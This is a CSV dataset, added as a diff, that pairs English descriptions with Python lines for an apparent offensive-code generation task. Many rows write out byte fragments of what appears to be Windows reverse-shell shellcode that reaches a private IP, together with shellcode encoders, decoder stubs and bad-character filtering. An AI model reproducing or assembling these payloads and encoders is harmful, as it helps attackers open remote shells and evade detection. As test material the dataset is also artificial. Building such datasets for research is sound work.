@@ -1,0 +1,376 @@
+raw_nl,temp_nl,raw_code,temp_code
+initialize bad_chars to the string '\x0a\x00\x0d',initialize var0 to string var2,bad_chars = '\x0a\x00\x0d',var0 = '\x0a\x00\x0d'
+"remove '\\x' from the second argument, decode it in hexadecimal, and save in bad_chars","remove var0 from second argument, decode it in hexadecimal, and save in var1","bad_chars = sys . argv [ 2 ] . replace ( '\\x' , '' ) . decode ( 'hex' )","var1 = sys . argv [ 2 ] . replace ( '\\x' , '' ) . decode ( 'hex' )"
+break,break,break,break
+exit from the iteration,exit from iteration,break,break
+break the cycle,break cycle,break,break
+break the loop,break loop,break,break
+"add the bytes literal ""\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5',var1 += b'\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5'
+"add the bytes literal ""\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c',var1 += b'\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c'
+"add the bytes literal ""\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf',var1 += b'\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf'
+"add the bytes literal ""\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7',var1 += b'\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7'
+"add the bytes literal ""\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68',var1 += b'\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68'
+"add the bytes literal ""\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68',var1 += b'\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68'
+"add the bytes literal ""\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68',var1 += b'\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68'
+"add the bytes literal ""\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89',var1 += b'\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89'
+"add the bytes literal ""\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec',var1 += b'\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec'
+"add the bytes literal ""\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5',var1 += b'\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5'
+"add the bytes literal ""\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8',var1 += b'\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8'
+"add the bytes literal ""\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30',var1 += b'\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30'
+"add the bytes literal ""\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f',var1 += b'\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f'
+"add the bytes literal ""\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0',var1 += b'\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0'
+"add the bytes literal ""\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01',var1 += b'\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01'
+"add the bytes literal ""\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00',var1 += b'\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00'
+"add the bytes literal ""\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0',var1 += b'\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0'
+"add the bytes literal ""\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44',var1 += b'\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44'
+"add the bytes literal ""\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31',var1 += b'\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31'
+"add the bytes literal ""\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x74\xc7\x68"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x74\xc7\x68',var1 += b'\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x74\xc7\x68'
+"add the bytes literal ""\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66',var1 += b'\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66'
+"add the bytes literal ""\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66',var1 += b'\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66'
+"add the bytes literal ""\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b',var1 += b'\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b'
+"add the bytes literal ""\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d',var1 += b'\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d'
+"add the bytes literal ""\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"" to the variable buf",add bytes literal var0 to variable var1,buf += b'\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f',var1 += b'\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f'
+Declare an empty bytes literal and store it in the variable buf,Declare empty bytes literal and store it in variable var0,buf = b'',var0 = b''
+byte is the sum of y and ROT modulo 256,byte is sum of y and var0 var1 256,byte = ( y + ROT ) % 256,byte = ( y + var0 ) % 256
+byte is byte xor XOR,byte is byte xor var0,byte = byte ^ XOR,byte = byte ^ var0
+byte is byte shifted left by nbits,byte is byte shifted left by var0,byte = byte << nbits,byte = byte << var0
+assign the first two elements of shellcode to chunk,assign first two elements of var0 to chunk,chunk = shellcode [ 0 : 2 ],chunk = var0 [ 0 : 2 ]
+add 1 to chunk_no,add 1 to var0,chunk_no += 1,var0 += 1
+chunk_no is integer 0,var0 is integer 0,chunk_no = 0,var0 = 0
+increment count by 1,increment count by 1,count += 1,count += 1
+count is integer 1,count is integer 1,count = 1,count = 1
+increase counter by 1,increase counter by 1,counter += 1,counter += 1
+counter is an integer 0,counter is integer 0,counter = 0,counter = 0
+cast the string hopcode to integer base 16 and save it into the variable Dec_hopcode,cast string hopcode to integer base 16 and save it into variable var0,"Dec_hopcode = int ( hopcode , 16 )","var0 = int ( hopcode , 16 )"
+add the string value '\\x' to the variable decoded,add string value var0 to variable decoded,decoded += '\\x',decoded += '\\x'
+Convert the variable x to a hexadecimal and store it in the variable decoded,Convert variable x to hexadecimal and store it in variable decoded,decoded += '%02x' % x,decoded += '%02x' % x
+initialize an empty string variable called decoded,initialize empty string variable called decoded,decoded = '',decoded = ''
+"Convert the variable x to a hexadecimal and add it to the variable decoded2 followed by ','",Convert variable x to hexadecimal and add it to variable var0 followed by var1,"decoded2 += '%02x, ' % x","var0 += '%02x, ' % x"
+add the string value '0x' to the variable decoded,add string value var0 to variable decoded,decoded2 += '0x',decoded2 += var0
+initialize an empty string variable called decoded2,initialize empty string variable called var0,decoded2 = '',var0 = ''
+append '\x02\xeb\xe4\xe8\xdc\xff\xff\xff' to decoder_stub,append var0 to var1,decoder_stub += '\x02\xeb\xe4\xe8\xdc\xff\xff\xff',var1 += '\x02\xeb\xe4\xe8\xdc\xff\xff\xff'
+concatenate the string '\x1c\x0f\x88\xdf\x88\xd0\x30\xd8' to decoder_stub,concatenate string var0 to var1,decoder_stub += '\x1c\x0f\x88\xdf\x88\xd0\x30\xd8',var1 += '\x1c\x0f\x88\xdf\x88\xd0\x30\xd8'
+append '\x31\xd8\x66\x89\x07\x41\x8d\x7f' to decoder_stub,append var0 to var1,decoder_stub += '\x31\xd8\x66\x89\x07\x41\x8d\x7f',var1 += '\x31\xd8\x66\x89\x07\x41\x8d\x7f'
+append the string '\x74\x16\x66\x8b\x44\x0f\x01\x66' to decoder_stub,append string var0 to var1,decoder_stub += '\x74\x16\x66\x8b\x44\x0f\x01\x66',var1 += '\x74\x16\x66\x8b\x44\x0f\x01\x66'
+concatenate '\xb2\x45\xeb\x1f\x5e\x8d\x3e\x8a' to decoder_stub,concatenate var0 to var1,decoder_stub += '\xb2\x45\xeb\x1f\x5e\x8d\x3e\x8a',var1 += '\xb2\x45\xeb\x1f\x5e\x8d\x3e\x8a'
+"add the string ""\x31\xd2\x5e\xbf\x90\x90\xaa\xaa"" to the variable decoder_stub",add string var0 to variable var1,decoder_stub += '\x31\xd2\x5e\xbf\x90\x90\xaa\xaa',var1 += '\x31\xd2\x5e\xbf\x90\x90\xaa\xaa'
+"add the string ""\x3c\x16\x32\x0c\x16\x32\x2c\x16"" to the variable decoder_stub",add string var0 to variable var1,decoder_stub += '\x3c\x16\x32\x0c\x16\x32\x2c\x16',var1 += '\x3c\x16\x32\x0c\x16\x32\x2c\x16'
+"add the string ""\x42\x42\x83\xc0\x04\x75\xc5\xff"" to the variable decoder_stub",add string var0 to variable var1,decoder_stub += '\x42\x42\x83\xc0\x04\x75\xc5\xff',var1 += '\x42\x42\x83\xc0\x04\x75\xc5\xff'
+"add the string ""\x7c\x04\x02\x88\x5c\x04\x03\x39"" to the variable decoder_stub",add string var0 to variable var1,decoder_stub += '\x7c\x04\x02\x88\x5c\x04\x03\x39',var1 += '\x7c\x04\x02\x88\x5c\x04\x03\x39'
+"add the string ""\x7c\x16\x05\x74\x0a\x42\x42\x42"" to the variable decoder_stub",add string var0 to variable var1,decoder_stub += '\x7c\x16\x05\x74\x0a\x42\x42\x42',var1 += '\x7c\x16\x05\x74\x0a\x42\x42\x42'
+"add the string ""\x7f\x83\xec\x7f\x8a\x5c\x16\x01"" to the variable decoder_stub",add string var0 to variable var1,decoder_stub += '\x7f\x83\xec\x7f\x8a\x5c\x16\x01',var1 += '\x7f\x83\xec\x7f\x8a\x5c\x16\x01'
+"add the string ""\x83\xec\x7f\x83\xec\x7f\x83\xec"" to the variable decoder_stub",add string var0 to variable var1,decoder_stub += '\x83\xec\x7f\x83\xec\x7f\x83\xec',var1 += '\x83\xec\x7f\x83\xec\x7f\x83\xec'
+"add the string ""\x88\x2c\x04\x88\x4c\x04\x01\x88"" to the variable decoder_stub",add string var0 to variable var1,decoder_stub += '\x88\x2c\x04\x88\x4c\x04\x01\x88',var1 += '\x88\x2c\x04\x88\x4c\x04\x01\x88'
+"add the string ""\x8a\x6c\x16\x04\x32\x1c\x16\x32"" to the variable decoder_stub",add string var0 to variable var1,decoder_stub += '\x8a\x6c\x16\x04\x32\x1c\x16\x32',var1 += '\x8a\x6c\x16\x04\x32\x1c\x16\x32'
+"add the string ""\x8a\x7c\x16\x02\x8a\x4c\x16\x03"" to the variable decoder_stub",add string var0 to variable var1,decoder_stub += '\x8a\x7c\x16\x02\x8a\x4c\x16\x03',var1 += '\x8a\x7c\x16\x02\x8a\x4c\x16\x03'
+"add the string ""\xe4\xe8\xa4\xff\xff\xff"" to the variable decoder_stub",add string var0 to variable var1,decoder_stub += '\xe4\xe8\xa4\xff\xff\xff',var1 += '\xe4\xe8\xa4\xff\xff\xff'
+decoder_stub is the string '\x31\xc0\x31\xdb\x31\xc9\x31\xd2',var0 is string var1,decoder_stub = '\x31\xc0\x31\xdb\x31\xc9\x31\xd2',var0 = '\x31\xc0\x31\xdb\x31\xc9\x31\xd2'
+"initialize the variable decoder_stub to ""\xeb\x57\x31\xc0\x31\xdb\x31\xc9""",initialize variable var0 to var2,decoder_stub = '\xeb\x57\x31\xc0\x31\xdb\x31\xc9',var0 = '\xeb\x57\x31\xc0\x31\xdb\x31\xc9'
+in decoder_stub replace '\x45' with bytes object containing the value xor_byte packed according to the format string unsigned char,in var0 replace var2 with bytes object containing value var3 packed according to format string unsigned char,"decoder_stub = decoder_stub . replace ( '\x45' , struct . pack ( 'B' , xor_byte ) )","var0 = var0 . replace ( '\x45' , struct . pack ( 'B' , var3 ) )"
+for each element in decoder_stub convert the element to an integer representing the unicode then convert it to a hexadecimal ignore slice at index 2 until the end and join separating each element by the string '\\x',for each element in var0 convert element to integer representing var2 then convert it to hexadecimal ignore slice at index 2 var3 end and join separating each element by string var4,decoder_stub_hex = '' . join ( '\\x{}' . format ( hex ( ord ( x ) ) [ 2 : ] ) for x in decoder_stub ),decoder_stub_hex = '' . join ( '\\x{}' . format ( hex ( ord ( x ) ) [ 2 : ] ) for x in var0 )
+define the function find_valid_xor_byte with input parameters bytes and bad_chars,define function var0 with input parameters bytes and var1,"def find_valid_xor_byte ( bytes , bad_chars ) : ","def var0 ( bytes , var1 ) : "
+define a method named mask that takes in n as a parameter,define method named mask var0 takes in n as parameter,def mask ( n ) : ,def mask ( n ) : 
+"define a method named rol with the parameters n, rotations, and width. Width has a default value of 8","define method named var0 with parameters n, rotations, and width var1 has default value of 8","def rol ( n , rotations , width = 8 ) : ","def var0 ( n , rotations , width = 8 ) : "
+"define a method named ror with the parameters n, rotations, and width. Width has a default value of 8","define method named var0 with parameters n, rotations, and width var1 has default value of 8","def ror ( n , rotations , width = 8 ) : ","def var0 ( n , rotations , width = 8 ) : "
+else if xxx is equal to the string '0x0',else if xxx is equal to string var0,elif xxx == '0x0':,elif xxx == var0:
+else,else,else:,else:
+declare an else statement,declare else statement,else:,else:
+"convert the value x in hexadecimal and append it to the string encode followed by ','",convert value x in hexadecimal and append it to string encode followed by var0,"encode += '%02x, ' % x","encode += '%02x, ' % x"
+append 0x to encode,append var0 to encode,encode += '0x',encode += 'var0'
+append 0xAA to encode,append var0 to encode,"encode += '0xAA, '","encode += 'var0, '"
+encode is an empty string,encode is empty string,encode = '',encode = ''
+append string '\\x' to encoded,append string var0 to encoded,encoded += '\\x',encoded += '\\x'
+append '\\x' to the string encoded,append var0 to string encoded,encoded += '\\x',encoded += '\\x'
+add the string value '\\x' to the variable encoded,add string value var0 to variable encoded,encoded += '\\x',encoded += '\\x'
+append string '\\x' followed by the conversion in hex of 0xAA to the string encoded,append string var0 followed by conversion in hex of var1 to string encoded,encoded += '\\x%02x' % 0xAA,encoded += '\\x%02x' % var1
+Convert the variable rand to a hexadecimal and add it to the variable encoded,Convert variable rand to hexadecimal and add it to variable encoded,encoded += '\\x%02x' % rand,encoded += '\\x%02x' % rand
+convert to hexadecimal a random integer between 1 and 169 and append it to the string encoded,convert to hexadecimal random integer between 1 and 169 and append it to string encoded,"encoded += '\\x%02x' % random . randint ( 1 , 169 )","encoded += '\\x%02x' % random . randint ( 1 , 169 )"
+append string '\\xbb' to encoded,append string var0 to encoded,encoded += '\\xbb',encoded += '\\xbb'
+append string '\\xcc' to encoded,append string var0 to encoded,encoded += '\\xcc',encoded += '\\xcc'
+append to the string encoded the hexadecimal conversion of the and operation between h and 0xff,append to string encoded hexadecimal conversion of and operation between h and var0,encoded += '%02x' % ( h & 0xff ),encoded += '%02x' % ( h & var0 )
+append to the string encoded the hexadecimal conversion of the and operation between x and 0xff,append to string encoded hexadecimal conversion of and operation between x and var0,encoded += '%02x' % ( x & 0xff ),encoded += '%02x' % ( x & var0 )
+"perform the and operation between y and 0xff, then convert the result in hexadecimal and append it to the string encoded",perform and operation between y and var0 then convert result in hexadecimal and append it to string encoded,encoded += '%02x' % ( y & 0xff ),encoded += '%02x' % ( y & var0 )
+append the value x converted in hex to the string encoded,append value x converted in hex to string encoded,encoded += '%02x' % x,encoded += '%02x' % x
+Convert the variable x to a hexadecimal and add it to the variable encoded,Convert variable x to hexadecimal and add it to variable encoded,encoded += '%02x' % x,encoded += '%02x' % x
+append the value y converted in hex to the string encoded,append value y converted in hex to string encoded,encoded += '%02x' % y,encoded += '%02x' % y
+Convert the value of y to hex and append it to the variable encoded,Convert value of y to hex and append it to variable encoded,encoded += '%02x' % y,encoded += '%02x' % y
+Convert the value of y to a hexadecimal then add it to the variable encoded,Convert value of y to hexadecimal then add it to variable encoded,encoded += '%02x' % y,encoded += '%02x' % y
+append to the string encoded the value (7 - (256 -x)) converted to hexadecimal,append to string encoded value (7 - (256 -x)) converted to hexadecimal,encoded += '%02x' % ( 7 - ( 256 - x ) ),encoded += '%02x' % ( 7 - ( 256 - x ) )
+convert (x+7) to hexadecimal and append it to the string encoded,convert (x+7) to hexadecimal and append it to string encoded,encoded += '%02x' % ( x + 7 ),encoded += '%02x' % ( x + 7 )
+"Convert the value of leader to hexadecimal, then slice it at the index of 2 and add its value to the variable encoded","Convert value of leader to hexadecimal, then slice it at index of 2 and add its value to variable encoded",encoded += hex ( leader ) [ 2 : ],encoded += hex ( leader ) [ 2 : ]
+slice the variable insertByte at index 2 and add the value to the variable encoded,slice variable var0 at index 2 and add value to variable encoded,encoded += insertByte [ 2 : ],encoded += var0 [ 2 : ]
+slice the variable xxx at index 2 and add the value to the variable encoded,slice variable xxx at index 2 and add value to variable encoded,encoded += xxx [ 2 : ],encoded += xxx [ 2 : ]
+set encoded to an empty string,set encoded to empty string,encoded = ' ',encoded = ' '
+set encoded to the string '\\x',set encoded to string var0,encoded = '\\x',encoded = '\\x'
+"encoded is a string """"",encoded is string var0,encoded = '',encoded = ''
+"encoded is string """"",encoded is string var0,encoded = '',encoded = ''
+encoded is an empty string,encoded is empty string,encoded = '',encoded = ''
+initialize an empty string variable called encoded,initialize empty string variable called encoded,encoded = '',encoded = ''
+"encoded is the concatenation of the string ""\\x"", the hexadecimal value of the length of array of bytes of the variable shellcode and the string ','","encoded is concatenation of string var0, hexadecimal value of length of array of bytes of variable var1 and string var2","encoded = '\\x%02x, ' % len ( bytearray ( shellcode ) )","encoded = '\\x%02x, ' % len ( bytearray ( var1 ) )"
+encoded is an empty list,encoded is empty list,encoded = [ ],encoded = [ ]
+append end to encoded,append end to encoded,encoded = encoded + end,encoded = encoded + end
+encoded_instruction_in_hex is a string containing the hexadecimal conversion of rox_encoded_instruction,var0 is string containing hexadecimal conversion of var1,encoded_instruction_in_hex = '%02x' % rox_encoded_instruction,var0 = '%02x' % var1
+"Convert the value of z bitwise and 0xff to a hexadecimal then add it to the variable encoded_nasm followed by ','",Convert value of z var0 and var1 to hexadecimal then add it to variable var2 followed by var4,"encoded_nasm += '%02x, ' % ( z & 0xff )","var2 += '%02x, ' % ( z & var1 )"
+add the string value '0x' to the variable encoded_nasm,add string value var0 to variable var1,encoded_nasm += '0x',var1 += var0
+initialize the variable encoded_nasm to an empty string,initialize variable var0 to empty string,encoded_nasm = '',var0 = ''
+"append the hexadecimal conversion of byte followed by ', ' to the string encoded_shellcode",append hexadecimal conversion of byte followed by var0 to string var1,"encoded_shellcode += '%02x, ' % byte","var1 += '%02x, ' % byte"
+"append the hexadecimal conversion of new followed by ', ' to the string encoded_shellcode",append hexadecimal conversion of new followed by var0 to string var1,"encoded_shellcode += '%02x, ' % new","var1 += '%02x, ' % new"
+"convert shift to hexadecimal and append it followed by ', ' to the string encoded_shellcode",convert shift to hexadecimal and append it followed by var0 to string var1,"encoded_shellcode += '%02x, ' % shift","var1 += '%02x, ' % shift"
+"convert xor in hexadecimal and append it followed by ', ' to the string encoded_shellcode",convert xor in hexadecimal and append it followed by var0 to string var1,"encoded_shellcode += '%02x, ' % xor","var1 += '%02x, ' % xor"
+append '0x' to the string encoded_shellcode,append var0 to string var1,encoded_shellcode += '0x',var1 += var0
+add the string value '\\x' to the variable encoded_shellcode,add string value var0 to variable var1,encoded_shellcode += '\\x',var1 += '\\x'
+Convert the value of z bitwise and 0xff to a hexadecimal then add it to the variable encoded_shellcode,Convert value of z var0 and var1 to hexadecimal then add it to variable var2,encoded_shellcode += '%02x' % ( z & 0xff ),var2 += '%02x' % ( z & var1 )
+"encoded_shellcode is a string """"",var0 is string var1,encoded_shellcode = '',var0 = ''
+initialize the variable encoded_shellcode to an empty string,initialize variable var0 to empty string,encoded_shellcode = '',var0 = ''
+append to encoded a bytes object containing the value val1 packed according to the format string unsigned char,append to encoded bytes object containing value var0 packed according to format string unsigned char,"encoded . append ( struct . pack ( 'B' , val1 ) )","encoded . append ( struct . pack ( 'B' , var0 ) )"
+append to encoded a bytes object containing the value xor_byte packed according to the format string unsigned char,append to encoded bytes object containing value var0 packed according to format string unsigned char,"encoded . append ( struct . pack ( 'B' , xor_byte ) )","encoded . append ( struct . pack ( 'B' , var0 ) )"
+add to encoded a bytes object containing the value xor_byte packed according to the format string unsigned char,add to encoded bytes object containing value var0 packed according to format string unsigned char,"encoded . append ( struct . pack ( 'B' , xor_byte ) )","encoded . append ( struct . pack ( 'B' , var0 ) )"
+append to encoded the bytes object containing the value xor_byte packed according to the format string unsigned char,append to encoded bytes object containing value var0 packed according to format string unsigned char,"encoded . append ( struct . pack ( 'B' , xor_byte ) )","encoded . append ( struct . pack ( 'B' , var0 ) )"
+add the string value '\\x' to the variable encoded1,add string value var0 to variable var1,encoded1 += '\\x',var1 += '\\x'
+Convert the value of j to a hexadecimal then add it to the variable encoded1,Convert value of j to hexadecimal then add it to variable var0,encoded1 += '%02x' % j,var0 += '%02x' % j
+initialize an empty string variable called encoded1,initialize empty string variable called var0,encoded1 = '',var0 = ''
+"add the string value ',' to the variable encoded2",add string value var0 to variable var1,"encoded2 += ', '","var1 += ', '"
+"Convert the value of j to a hexadecimal then add it to the variable encoded2 followed by the string ', '",Convert value of j to hexadecimal then add it to variable var0 followed by string var1,"encoded2 += '%02x, ' % j","var0 += '%02x, ' % j"
+"Convert the value of y bitwise and 0xff to a hexadecimal then add it to the variable encoded2 followed by the string ','",Convert value of y var0 and var1 to hexadecimal then add it to variable var2 followed by string var3,"encoded2 += '%02x, ' % ( y & 0xff )","var2 += '%02x, ' % ( y & var1 )"
+"Convert the value of x to a hexadecimal then add it to the variable encoded2 followed by the string ', '",Convert value of x to hexadecimal then add it to variable var0 followed by string var1,"encoded2 += '%02x, ' % x","var0 += '%02x, ' % x"
+"Convert the variable x to a hexadecimal. Concatenate the result with the string ',' add the result to the variable encoded2",Convert variable x to hexadecimal var0 result with string var1 add result to variable var2,"encoded2 += '%02x, ' % x","var2 += '%02x, ' % x"
+"Convert the variable y to a hexadecimal. Concatenate the result with the string ',' and add the result to the variable encoded2",Convert variable y to hexadecimal var0 result with string var1 and add result to variable var2,"encoded2 += '%02x, ' % y","var2 += '%02x, ' % y"
+"convert (7 -(256 - x)) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded2","convert (7 -(256 - x)) to hexadecimal, concatenate result with string var0 and append it to string var1","encoded2 += '%02x, ' % ( 7 - ( 256 - x ) )","var1 += '%02x, ' % ( 7 - ( 256 - x ) )"
+"Convert the value of h bitwise and 0xff to a hexadecimal, concatenate the result with the string ',' and then add it to the variable encoded2","Convert value of h var0 and var1 to hexadecimal, concatenate result with string var2 and then add it to variable var3","encoded2 += '%02x, ' % ( h & 0xff )","var3 += '%02x, ' % ( h & var1 )"
+"convert (x+7) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded2","convert (x+7) to hexadecimal, concatenate result with string var0 and append it to string var1","encoded2 += '%02x, ' % ( x + 7 )","var1 += '%02x, ' % ( x + 7 )"
+"Convert the value of y to a hexadecimal, concatenate the result with the string ',' and then add it to the variable encoded2","Convert value of y to hexadecimal, concatenate result with string var0 and then add it to variable var1","encoded2 += '%02x, ' % y","var1 += '%02x, ' % y"
+append string '0x' to encoded2,append string var0 to var1,encoded2 += '0x',var1 += var0
+append '0x' to the string encoded2,append var0 to string var1,encoded2 += '0x',var1 += var0
+add the string value '0x' to the variable encoded2,add string value var0 to variable var1,encoded2 += '0x',var1 += var0
+concatenate the string '0x' with the hexadecimal conversion of 0xAA and append the result to the string encoded2,concatenate string var0 with hexadecimal conversion of var1 and append result to string var2,"encoded2 += '0x%02x, ' % 0xAA","var2 += '0x%02x, ' % var1"
+concatenate the string '0x' with the hexadecimal conversion of rand and append the result to the string encoded2,concatenate string var0 with hexadecimal conversion of rand and append result to string var1,"encoded2 += '0x%02x, ' % rand","var1 += '0x%02x, ' % rand"
+"Convert the value of leader to hexadecimal, then slice it at the index of 2 and add its value to the variable encoded2","Convert value of leader to hexadecimal, then slice it at index of 2 and add its value to variable var0",encoded2 += hex ( leader ) [ 2 : ],var0 += hex ( leader ) [ 2 : ]
+slice the variable insertByte at index 2 and add the value to the variable encoded2,slice variable var0 at index 2 and add value to variable var1,encoded2 += insertByte [ 2 : ],var1 += var0 [ 2 : ]
+add the value of xxx to the variable encoded2,add value of xxx to variable var0,encoded2 += xxx,var0 += xxx
+set the variable encoded2 to an empty string,set variable var0 to empty string,encoded2 = ' ',var0 = ' '
+set encoded2 to the string '0x',set var0 to string var1,encoded2 = '0x',var0 = var1
+"encoded2 is a string """"",var0 is string var1,encoded2 = '',var0 = ''
+"encoded2 is string """"",var0 is string var1,encoded2 = '',var0 = ''
+encoded2 is an empty string,var0 is empty string,encoded2 = '',var0 = ''
+initialize an empty string variable called encoded2,initialize empty string variable called var0,encoded2 = '',var0 = ''
+"encoded2 is the concatenation of the string ""0x"" with the hexadecimal conversion of the lenght of the array of bytes of shellcode",var0 is concatenation of string var1 with hexadecimal conversion of var2 of array of bytes of var3,"encoded2 = '0x%02x, ' % len ( bytearray ( shellcode ) )","var0 = '0x%02x, ' % len ( bytearray ( var3 ) )"
+"convert the value x to hex, concatenate the result with ',' and append it to the string encoded2P2","convert value x to hex, concatenate result with var0 and append it to string var1","encoded2P2 += '%02x, ' % x","var1 += '%02x, ' % x"
+append string '0x' to encoded2P2,append string var0 to var1,encoded2P2 += '0x',var1 += var0
